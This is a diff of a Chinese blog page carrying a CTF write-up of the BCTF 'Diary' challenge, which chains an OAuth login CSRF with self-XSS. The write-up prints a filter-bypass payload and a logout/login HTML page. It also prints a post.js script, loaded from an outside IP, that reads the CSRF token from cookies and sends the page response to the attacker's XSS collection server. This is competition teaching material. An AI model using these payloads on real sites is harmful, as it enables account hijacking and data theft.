@@ -98,7 +98,7 @@
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。">
 <meta property="og:image" content="http://i.imgur.com/m2gvx3I.png">
-<meta property="og:updated_time" content="2017-08-31T09:20:28.949Z">
+<meta property="og:updated_time" content="2017-10-01T16:41:53.274Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OAuth授权流程学习以及Turning Self-XSS into Good-XSS">
 <meta name="twitter:description" content="说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。">
@@ -305,6 +305,11 @@
           
 
           
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
 
           
 
@@ -343,9 +348,10 @@
 <p><strong>两个xss点介绍</strong><br>然后再看下xss点，我们可以给admin发送链接，通过这个url漏洞可以将admin定位到任意url点<code>http://diary.bctf.xctf.org.cn/static/%5c%5cxss平台/xss.html</code><br>另外一个xss点是在我们以自己的身份登陆的时候可以在diary域看到自己的留言，这块只能让admin以我们的身份登陆的时候才能看到并触发</p>
 <p><strong>xss点过滤介绍</strong><br>第一个xss点因为是在我们自己的vps上触发，所以是没有任何过滤的<br>第二个xss点是在留言板上回显，通过filter.js对输出进行了一些编码，通过HTML实体编码或者<code>&lt;iframe srcdoc=&quot;&lt;img src=x onerror=&#39;alert(1);&#39;&gt;&quot;&gt;</code>都可以绕过</p>
 <p><strong>我们的目的以及利用思路介绍</strong><br>要拿到flag需要让admin在<code>http://diary.bctf.xctf.org.cn/survey/</code>下提交表单，并携带自己cookie中的token才行，第一个xss点在自己的vps上是拿不到cookie的，所以我们只能着眼与第二个域内的xss点才能通过js代码拿admin的cookie中的信息，而第二个xss点需要在自己的账户才能触发，所以需要让admin先退出在diary的登陆，然后登陆我们自己的账户才能触发代码，这块代码需要将admin登陆回自己的账户，再拿取cookie中信息并进行表单提交，最后拿到flag。<br>整个流程中的两处logout以及login需要留意，因为涉及到OAuth的操作方式，这也是我们在下面具体操作过程中需要留意的</p>
-<p><strong>具体操作过程</strong><br>首先通过第一个xss点让admin定位到我们自己的xss.html里面，这里面需要退出admin在diary内的登陆，然后登陆我们的账户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;img-src http://diary.bctf.xctf.org.cn/&quot;&gt;</div><div class="line">&lt;img src=&quot;http://diary.bctf.xctf.org.cn/accounts/logout/&quot; onerror=&quot;login();&quot;&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    var login = function() &#123;</div><div class="line">        var loginImg = document.createElement(&apos;img&apos;);</div><div class="line">        loginImg.src = &quot;http://diary.bctf.xctf.org.cn/accounts/login/&quot;;</div><div class="line">        loginImg.onerror = redir;</div><div class="line">    &#125;</div><div class="line">    var redir = function() &#123;</div><div class="line">        //这里code是登陆的时候抓包拦下来的</div><div class="line">        var code=&quot;d4SOl5u07GvJhsz5co1V084hGrQLoz&quot;;</div><div class="line">        var loginImg2 = document.createElement(&apos;img&apos;);</div><div class="line">        loginImg2.src = &apos;http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code=&apos;+code;</div><div class="line">        loginImg2.onerror = function() &#123;</div><div class="line">            window.location = &apos;http://diary.bctf.xctf.org.cn/diary/&apos;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p><strong>具体操作过程</strong><br>首先通过第一个xss点让admin定位到我们自己的xss.html里面，这里面需要退出admin在diary内的登陆，然后登陆我们的账户<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"img-src http://diary.bctf.xctf.org.cn/"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://diary.bctf.xctf.org.cn/accounts/logout/"</span> <span class="attr">onerror</span>=<span class="string">"login();"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">    var login = function() &#123;</div><div class="line">        var loginImg = document.createElement('img');</div><div class="line">        loginImg.src = "http://diary.bctf.xctf.org.cn/accounts/login/";</div><div class="line">        loginImg.onerror = redir;</div><div class="line">    &#125;</div><div class="line">    var redir = function() &#123;</div><div class="line">        //这里code是登陆的时候抓包拦下来的</div><div class="line">        var code="d4SOl5u07GvJhsz5co1V084hGrQLoz";</div><div class="line">        var loginImg2 = document.createElement('img');</div><div class="line">        loginImg2.src = 'http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code='+code;</div><div class="line">        loginImg2.onerror = function() &#123;</div><div class="line">            window.location = 'http://diary.bctf.xctf.org.cn/diary/';</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>留意登陆我们账户的过程，正常登陆过程是向auth域内的认证页面发送请求，验证auth域登陆状态后发送code回去，但这里我们auth域的登陆状态是admin的，所以这里我们直接跳过第一个url，直接向diary域发送由auth下发的代表我们自己账户的code，那code怎么来呢？通过burp抓包就可以了，注意burp中要把那个发送code的请求拦下来晾在那里不要发出去，这样我们就成功的让admin以我们自己的身份登陆了，之后将admin浏览器定位到第二个xss点</p>
-<p>这里的我们我们要做的任务就是将admin重新登陆自己的账户，并POST表单来拿flag，这里怎么登陆呢，其实很简单，我们直接向auth域发送登陆请求就可以了，因为admin浏览器的auth域一直都在以admin的身份登陆着，所以下发的code就可以让admin登陆回自己的diary域。之后就是通过xhr提交表单请求，并发送页面反馈信息回自己的xss平台拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">第二个xss点，跳转到post.js执行js代码</div><div class="line">&lt;iframe srcdoc=&quot;&lt;script src=&apos;http://diary.bctf.xctf.org.cn/static/js/jquery.min.js&apos;&gt;&lt;/script&gt;&lt;script src=&apos;http://104.160.43.154:8000/myjs/post.js&apos;&gt;&lt;/script&gt;&quot;&gt;</div><div class="line"></div><div class="line">post.js</div><div class="line">var loginIframe = window.top.document.createElement(&apos;iframe&apos;);</div><div class="line">loginIframe.setAttribute(&apos;src&apos;, &apos;http://104.160.43.154:8000/myjs/in_and_out.html&apos;);</div><div class="line">window.top.document.body.appendChild(loginIframe);</div><div class="line">setTimeout(function() &#123;</div><div class="line">    $.post(&quot;http://diary.bctf.xctf.org.cn/survey/&quot;,</div><div class="line">        &#123;</div><div class="line">            rate:&apos;5&apos;,</div><div class="line">            suggestion:&apos;123&apos;,</div><div class="line">            csrfmiddlewaretoken:document.cookie.split(&apos;;&apos;)[0].split(&apos;=&apos;)[1]</div><div class="line">           &#125;,</div><div class="line">        function (data)&#123;</div><div class="line">            $.get(&quot;http://xss平台?a=&quot;+escape(data),functoon(data,status)&#123;&#125;);</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;, 6000);</div></pre></td></tr></table></figure></p>
+<p>这里的我们我们要做的任务就是将admin重新登陆自己的账户，并POST表单来拿flag，这里怎么登陆呢，其实很简单，我们直接向auth域发送登陆请求就可以了，因为admin浏览器的auth域一直都在以admin的身份登陆着，所以下发的code就可以让admin登陆回自己的diary域。之后就是通过xhr提交表单请求，并发送页面反馈信息回自己的xss平台拿到flag<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">第二个xss点，跳转到post.js执行js代码</div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script src='http://diary.bctf.xctf.org.cn/static/js/jquery.min.js'&gt;&lt;/script&gt;&lt;script src='http://104.160.43.154:8000/myjs/post.js'&gt;&lt;/script&gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">post.js</div><div class="line"><span class="keyword">var</span> loginIframe = <span class="built_in">window</span>.top.document.createElement(<span class="string">'iframe'</span>);</div><div class="line">loginIframe.setAttribute(<span class="string">'src'</span>, <span class="string">'http://104.160.43.154:8000/myjs/in_and_out.html'</span>);</div><div class="line"><span class="built_in">window</span>.top.document.body.appendChild(loginIframe);</div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.post(<span class="string">"http://diary.bctf.xctf.org.cn/survey/"</span>,</div><div class="line">        &#123;</div><div class="line">            <span class="attr">rate</span>:<span class="string">'5'</span>,</div><div class="line">            <span class="attr">suggestion</span>:<span class="string">'123'</span>,</div><div class="line">            <span class="attr">csrfmiddlewaretoken</span>:<span class="built_in">document</span>.cookie.split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</div><div class="line">           &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</div><div class="line">            $.get(<span class="string">"http://xss平台?a="</span>+<span class="built_in">escape</span>(data),functoon(data,status)&#123;&#125;);</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;, <span class="number">6000</span>);</div></pre></td></tr></table></figure>
 <h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><p>xss题目一直是比赛中必出的一类题，玩法多样有趣，我从今年三月份开始打ctf并学习xss到现在，xss题目没做多少，也就是0ctf里那两道以及bctf这一道，还有看各路大佬打pwnhub后写的xss题目的wp，但笔记就已经做了万把字了，主要原因还是在于xss题目trick极多，比较难入手，（不过还是同意wupco师傅说的，自己菜才是原罪2333）。等到有一天觉得自己对xss了解的够多了，就把这一路的笔记发出来，毕竟相比sql注入啥的漏洞，xss的学习资源更少，逻辑也更绕，手法也更多样，哎算了，就我的xss水平还是先别立flag了，先踏实做吧。<br>对了，每次做xss题目，输入payload然后盯着自己的xss平台等访问请求的那种感觉真的是贼爽，如果真的接收到了发过来的访问就感觉和中了彩票一样高兴，我想这也是支持我去一点点的学习xss的主要原因吧。</p>
 
       
@@ -536,6 +542,12 @@
     <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Yiruma</span>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
 </div>
 
 
@@ -552,6 +564,26 @@
 
 
         
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
 
         
       </div>
